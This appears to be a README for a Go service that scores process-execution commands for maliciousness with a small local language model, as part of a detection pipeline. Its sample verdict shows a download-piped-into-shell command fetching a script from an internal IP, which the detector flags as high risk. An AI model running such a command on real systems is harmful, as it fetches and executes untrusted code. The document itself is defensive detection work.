# ExecGuard — P2 Scorer

The **P2** seat: a Go service that consumes the P1 sensor's events on stdin,
scores each `execve`/`execveat` command with a **small local LLM
(`llama3.2:1b` via Ollama)**, and emits banded `Verdict` lines on stdout for P3.

```
P1 sensor ──JSONL events──► [ P2 scorer ] ──JSONL verdicts──► P3 reporter
                                 │  cache → async pool → Ollama → band
```

Zero external Go dependencies (standard library only), so `go build` works offline.

## Build & run

```bash
go build -o scorer .

# Step A — no model needed (keyword heuristic):
./scorer --mock < sample-events.jsonl

# Step B — real model:
ollama serve              # if not already running
ollama pull llama3.2:1b   # one-time (~1.3 GB, runs CPU-only in a small VM)
./scorer < sample-events.jsonl

# Live, end-to-end:
sudo ../bin/execguard | ./scorer | <p3-reporter>
```

Flags: `--mock`, `--model <name>` (default `llama3.2:1b`), `--workers <n>`
(default 1 — one inference at a time, sized for a 4-vCPU CPU-only VM),
`--cache-size <n>` (default 4096).

`llama3.2:1b` was chosen for speed on a CPU-only VM: ~2.5 s per *distinct*
command on 4 aarch64 cores, ~1.3 GB on disk, ~2.5–3 GB RAM. Caching means only
novel commands hit the model. Swap to a larger model (e.g. `phi3`) with
`--model phi3` when accuracy matters more than latency.

Expected for `--mock < sample-events.jsonl`: 5 verdicts — `ls`=LOW (×2, the
second `source:"cache"`), `curl|sh`=HIGH, `/tmp` exec=GRAY, `base64`=GRAY — and
on **stderr** the summary `read=6 exec_scored=4 cache_hits=1 non_exec_skipped=1`.

## Contracts

**Input (P1 → P2):** newline-delimited JSON. Common envelope
(`schema_version, event_type, timestamp, ktime_ns, pid, tid, uid, gid, comm,
cgroup_id, dropped_so_far`) plus a per-`event_type` payload. P2 scores
`execve`/`execveat` only (`ppid`, `parent_comm`, `executable`, `argv`, …);
all other event types are decoded-and-skipped.

**Output (P2 → P3):** one `Verdict` per scored command:

```json
{"schema_version":1,"ts":"…","pid":4531,"ppid":4500,"comm":"bash",
 "parent_comm":"sshd","executable":"/usr/bin/bash",
 "command":"bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
 "risk_score":0.93,"verdict":"malicious","band":"HIGH",
 "reason":"download piped into a shell","mitre":["T1059","T1105"],
 "risk_indicators":["curl|sh"],"source":"llm"}
```

Bands key on `risk_score` (probability malicious): **HIGH ≥ 0.75, GRAY 0.35–0.75,
LOW < 0.35**. `source` ∈ `llm | cache | error`.

## Code map

| File | Responsibility |
|------|----------------|
| `event.go` | input structs (`Envelope`, `ExecEvent`), `IsExec`, `CommandLine` |
| `cache.go` | `argvKey` (sha256 of exec+argv) + bounded FIFO `Cache` of score results |
| `verdict.go` | `bandFor`, the `Verdict` output struct, `newVerdict`, `errorResult` |
| `llm.go` | `Scorer` interface, `OllamaClient` (prompt, few-shot, JSON extract/clamp) |
| `mock.go` | `MockScorer` — keyword heuristic, runs with no model |
| `main.go` | stdin reader → single-flight async worker pool → ordered stdout writer |

`Scorer` is the seam: `OllamaClient` and `MockScorer` both satisfy it, so
swapping backends never touches `main.go`.

## Design note — no deterministic floor

This branch is **LLM-only**: the model scores every command; `MockScorer` is just
a no-model dev fallback. If Ollama is unreachable, commands surface as
`source:"error"` GRAY verdicts (never silent drops). This intentionally does
**not** satisfy the brief's "the LLM must not be the only detection mechanism" —
we accept full local-model dependence and surface failures rather than hide them.
Secrets in `argv` are untrusted; redaction before any model call is a TODO.

## Tests

```bash
go test ./...
```

Covers the pure functions: `bandFor` (incl. 0.75/0.35 boundaries), `argvKey`
(stability + no split collisions), `parseResult` (clean JSON, prose-wrapped,
clamping, missing-verdict fill, no-JSON error), and `IsExec`.
